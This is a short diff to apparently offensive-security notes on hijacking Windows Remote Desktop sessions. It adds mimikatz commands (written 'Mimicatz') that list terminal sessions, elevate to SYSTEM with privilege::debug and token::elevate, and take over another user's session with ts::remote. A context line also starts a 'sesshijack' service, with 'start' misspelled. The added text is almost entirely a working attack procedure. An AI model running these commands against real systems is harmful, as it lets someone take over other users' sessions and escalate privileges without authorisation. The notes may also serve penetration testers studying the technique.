@@ -10,3 +10,16 @@
 
 # Start the service
 >net setart sesshijack
+
+
+
+
+# There is now a mimicatz module for this.
+
+Mimicatz: # ts::sessions
+Mimicatz: # ts::remote /id:<ID>
+# If an arror comes back about bad password then you may need to elevate to SYSTEM
+
+Mimicatz: # privilege::debug
+Mimicatz: # token::elevate
+Mimicatz: # ts::remote /id:<ID>
